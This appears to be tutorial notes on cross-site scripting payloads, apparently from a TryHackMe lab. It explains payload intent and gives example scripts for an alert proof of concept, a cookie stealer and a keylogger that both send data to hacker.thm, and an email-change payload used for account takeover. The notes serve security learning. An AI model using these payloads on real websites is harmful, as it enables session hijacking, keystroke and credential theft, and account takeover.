In XSS attacks, payload is the JavaScript code that we want to execute on the target's computer. Payload has two components:
- **Intention (Intent)**: What we actually want JavaScript to do
- **Modification (Change)**: The changes the code needs to make to work in every scenario

---

## Payload Types and Examples

### 1. Proof Of Concept (PoC)

**Purpose**: Demonstrate/prove an XSS vulnerability on a website

**Characteristics**:
- The simplest type of payload
- Opens an alert box on the page
- Shows the attacker's authority

**Example Code**:
```javascript
<script>alert('XSS');</script>
```

---

### 2. Session Stealing

**Purpose**: Steal the target's session information (login token, cookies)

**How It Works**:
1. Retrieves the target's cookie
2. Encodes it with Base64 (for secure transmission)
3. Sends it to the attacker's controlled server
4. The attacker uses these cookies to log into the target's account

**Example Code**:
```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Risk Level**: 🔴 Very High (Full Account Control)

---

### 3. Key Logger

**Purpose**: Record everything the target types on the website

**How It Works**:
1. Monitors the user's keystrokes
2. Sends typed characters to the attacker's server
3. Transmitted with Base64 encoding

**Example Code**:
```javascript
<script>
  document.onkeypress = function(e) { 
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
  }
</script>
```

**Risk Scenarios**:
- Login credentials (username, password)
- Credit card numbers
- Personal information
- Email addresses

**Risk Level**: 🔴 Very High (Financial & Personal Data Theft)

---

### 4. Business Logic

**Purpose**: Call and modify specific functions of the target website

**How It Works**:
1. Calls the website's JavaScript functions
2. Performs operations on behalf of the user
3. Changes account settings or data

**Example Code**:
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Attack Chain Example**:
1. Changes email address to `attacker@hacker.thm`
2. Sends a password reset request
3. The reset link arrives at the attacker's email
4. The attacker gains full account access

**Risk Level**: 🔴 Very High (Full Account Control)

---

## Payload Components Summary

| Component | Description | Example |
|-----------|-------------|---------|
| **Intention** | The actual purpose of the payload | Session stealing, key logging |
| **Modification** | Changes made to the code | Target URL, encoding method |
| **Execution Context** | The environment where the payload runs | DOM, Event Handler, Script Tag |